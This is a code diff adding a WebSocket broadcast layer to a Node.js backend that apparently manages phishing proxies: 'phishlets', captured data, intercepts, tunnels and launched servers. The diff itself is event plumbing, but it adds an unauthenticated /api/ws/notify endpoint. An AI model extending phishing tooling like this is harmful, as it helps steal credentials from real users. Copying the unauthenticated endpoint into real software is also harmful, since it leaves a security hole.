@@ -3,6 +3,7 @@
 // Handles the same API surface that the Expo app expects.
 import http from "node:http";
 import https from "node:https";
+import { WebSocketServer } from "ws";
 
 const PORT = parseInt(process.env.PORT || "8787", 10);
 const API_KEY = process.env.API_KEY || "";
@@ -618,6 +619,23 @@ function parsePath(pathname) {
   return { type: "unknown" };
 }
 
+
+// ── WebSocket real-time event bus ───────────────────────────────────────────
+
+/** Connected WebSocket clients. */
+const wsClients = new Set();
+
+/** Broadcast an event to all connected WebSocket clients. */
+function broadcast(type, payload = null) {
+  if (wsClients.size === 0) return;
+  const message = JSON.stringify({ type, payload, ts: Date.now() });
+  for (const ws of wsClients) {
+    if (ws.readyState === 1 /* WebSocket.OPEN */) {
+      ws.send(message);
+    }
+  }
+}
+
 // ── Request handler ─────────────────────────────────────────────────────────
 async function handleRequest(req, res) {
   // Stash metadata on res so `json()` auto-logs every response
@@ -691,6 +709,7 @@ async function handleRequest(req, res) {
         updatedAt: now,
       };
       items.unshift(item);
+      broadcast("items:changed");
       return json(res, 201, { success: true, data: item }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
@@ -710,6 +729,7 @@ async function handleRequest(req, res) {
       if (body?.description !== undefined)
         items[idx].description = String(body.description);
       items[idx].updatedAt = Date.now();
+      broadcast("items:changed");
       return json(res, 200, { success: true, data: items[idx] }, cors);
     }
     if (method === "DELETE") {
@@ -719,6 +739,8 @@ async function handleRequest(req, res) {
       if (idx === -1)
         return json(res, 404, { success: false, error: "item not found" }, cors);
       const [deleted] = items.splice(idx, 1);
+      broadcast("items:changed");
+      broadcast("health:changed");
       return json(res, 200, { success: true, data: deleted }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
@@ -769,6 +791,7 @@ async function handleRequest(req, res) {
         updatedAt: now,
       };
       proxies.push(proxy);
+      broadcast("proxies:changed");
       return json(res, 201, { success: true, data: proxy }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
@@ -799,6 +822,7 @@ async function handleRequest(req, res) {
       if (body?.phishlet !== undefined)
         proxies[idx].phishlet = String(body.phishlet);
       proxies[idx].updatedAt = Date.now();
+      broadcast("proxies:changed");
       return json(res, 200, { success: true, data: proxies[idx] }, cors);
     }
     if (method === "DELETE") {
@@ -810,6 +834,9 @@ async function handleRequest(req, res) {
         if (intercepts[i].slug === slug) intercepts.splice(i, 1);
       }
       const [deleted] = proxies.splice(idx, 1);
+      broadcast("proxies:changed");
+      broadcast("intercepts:changed");
+      broadcast("traffic:changed");
       return json(res, 200, { success: true, data: deleted }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
@@ -840,6 +867,7 @@ async function handleRequest(req, res) {
       if (result) {
         proxy.phishlet = result.phishlet;
         proxy.updatedAt = Date.now();
+        broadcast("proxies:changed");
         return json(res, 200, { success: true, data: { proxyId: route.id, phishlet: result.phishlet } }, cors);
       }
     }
@@ -848,6 +876,7 @@ async function handleRequest(req, res) {
     const phishlet = buildStubPhishlet(proxy.name, proxy.targetUrl, hostname);
     proxy.phishlet = phishlet;
     proxy.updatedAt = Date.now();
+    broadcast("proxies:changed");
     return json(res, 200, { success: true, data: { proxyId: route.id, phishlet } }, cors);
   }
 
@@ -874,6 +903,7 @@ async function handleRequest(req, res) {
       if (result) {
         proxy.phishlet = result.phishlet;
         proxy.updatedAt = Date.now();
+        broadcast("proxies:changed");
         return json(res, 200, { success: true, data: { proxyId: route.id, phishlet: result.phishlet } }, cors);
       }
     }
@@ -884,6 +914,7 @@ async function handleRequest(req, res) {
     const phishlet = buildStubPhishlet(proxy.name, proxy.targetUrl, hostname);
     proxy.phishlet = phishlet;
     proxy.updatedAt = Date.now();
+    broadcast("proxies:changed");
     return json(res, 200, { success: true, data: { proxyId: route.id, phishlet } }, cors);
   }
 
@@ -909,6 +940,7 @@ async function handleRequest(req, res) {
         captured: body?.captured,
       });
       if (result) {
+        broadcast("proxies:changed");
         return json(res, 200, {
           success: true,
           data: {
@@ -924,6 +956,7 @@ async function handleRequest(req, res) {
     }
 
     // Fallback: echo back
+    broadcast("proxies:changed");
     return json(res, 200, {
       success: true,
       data: { proxyId: route.id, phishlet: currentPhishlet, passes: 1, critiques: [], improvements: [], score: 50 },
@@ -946,6 +979,7 @@ async function handleRequest(req, res) {
       const authErr = checkAuth(req);
       if (authErr) return json(res, authErr.status, authErr.body, cors);
       intercepts.length = 0;
+      broadcast("intercepts:changed");
       return json(res, 200, { success: true, data: null }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
@@ -1066,6 +1100,7 @@ async function handleRequest(req, res) {
       }
       const masked = { ...configStore };
       if (masked.API_KEY) masked.API_KEY = "***";
+      broadcast("config:changed");
       return json(res, 200, { success: true, data: masked }, cors);
     }
     if (method === "DELETE") {
@@ -1074,6 +1109,7 @@ async function handleRequest(req, res) {
       for (const k of Object.keys(configStore)) {
         delete configStore[k];
       }
+      broadcast("config:changed");
       return json(res, 200, { success: true, data: {} }, cors);
     }
     return json(res, 405, { success: false, error: "method not allowed" }, cors);
@@ -1093,6 +1129,8 @@ async function handleRequest(req, res) {
     if (authErr) return json(res, authErr.status, authErr.body, cors);
     const body = await readBody(req);
     const result = await proxyManagerFetch("/api/proxy/tunnels", { method: "POST", body });
+    broadcast("tunnels:changed");
+    broadcast("proxyStatus:changed");
     return json(res, result.status, result.body, cors);
   }
 
@@ -1112,6 +1150,8 @@ async function handleRequest(req, res) {
     const authErr = checkAuth(req);
     if (authErr) return json(res, authErr.status, authErr.body, cors);
     const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelMatch[1]}`, { method: "DELETE" });
+    broadcast("tunnels:changed");
+    broadcast("proxyStatus:changed");
     return json(res, result.status, result.body, cors);
   }
 
@@ -1120,6 +1160,8 @@ async function handleRequest(req, res) {
     const authErr = checkAuth(req);
     if (authErr) return json(res, authErr.status, authErr.body, cors);
     const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelStartMatch[1]}/start`, { method: "POST" });
+    broadcast("tunnels:changed");
+    broadcast("proxyStatus:changed");
     return json(res, result.status, result.body, cors);
   }
 
@@ -1128,6 +1170,8 @@ async function handleRequest(req, res) {
     const authErr = checkAuth(req);
     if (authErr) return json(res, authErr.status, authErr.body, cors);
     const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelStopMatch[1]}/stop`, { method: "POST" });
+    broadcast("tunnels:changed");
+    broadcast("proxyStatus:changed");
     return json(res, result.status, result.body, cors);
   }
 
@@ -1206,6 +1250,8 @@ async function handleRequest(req, res) {
     if (authErr) return json(res, authErr.status, authErr.body, cors);
     const body = await readBody(req);
     const result = await proxyManagerFetch("/api/proxy/servers/launch", { method: "POST", body });
+    broadcast("servers:changed");
+    broadcast("proxyStatus:changed");
     return json(res, result.status, result.body, cors);
   }
 
@@ -1227,6 +1273,8 @@ async function handleRequest(req, res) {
     const authErr = checkAuth(req);
     if (authErr) return json(res, authErr.status, authErr.body, cors);
     const result = await proxyManagerFetch(`/api/proxy/servers/${serverStopMatch[1]}/stop`, { method: "POST" });
+    broadcast("servers:changed");
+    broadcast("proxyStatus:changed");
     return json(res, result.status, result.body, cors);
   }
 
@@ -1270,6 +1318,9 @@ async function handleRequest(req, res) {
       },
     });
     const tunnel = tunnelResult.body?.data || {};
+    broadcast("proxies:changed");
+    broadcast("tunnels:changed");
+    broadcast("proxyStatus:changed");
     return json(res, 200, {
       success: true,
       data: { hostname: body?.hostname || "proxy.example.com", target: `127.0.0.1:${tunnel.remotePort || PORT}`, tunnelId: tunnel.id },
@@ -1313,6 +1364,17 @@ async function handleRequest(req, res) {
     );
   }
 
+  // ── WebSocket notify endpoint (for proxy-manager to trigger broadcasts) ──
+  if (pathname === "/api/ws/notify" && method === "POST") {
+    const body = await readBody(req);
+    if (body?.type) {
+      broadcast(body.type, body.payload ?? null);
+      if (body.type === "traffic:changed") broadcast("health:changed");
+      if (body.type === "intercepts:changed") broadcast("health:changed");
+    }
+    return json(res, 200, { success: true }, cors);
+  }
+
   // Beacon (fire-and-forget)
   if (route.type === "beacon") {
     res.writeHead(204, cors);
@@ -1351,7 +1413,18 @@ async function handleRequest(req, res) {
 
 // ── Start server ────────────────────────────────────────────────────────────
 const server = http.createServer(handleRequest);
+
+// Attach WebSocket server to the same HTTP server
+const wss = new WebSocketServer({ server, path: "/ws" });
+wss.on("connection", (ws) => {
+  wsClients.add(ws);
+  ws.on("close", () => wsClients.delete(ws));
+  ws.on("error", () => wsClients.delete(ws));
+  ws.send(JSON.stringify({ type: "connected", payload: { uptime: Math.round((Date.now() - startedAt) / 1000) }, ts: Date.now() }));
+});
+
 server.listen(PORT, "0.0.0.0", () => {
   console.log(`[server] listening on http://0.0.0.0:${PORT}`);
+  console.log(`[server] WebSocket on ws://0.0.0.0:${PORT}/ws`);
   console.log(`[server] API_KEY ${API_KEY ? "configured" : "not set (auth disabled)"}`);
 });
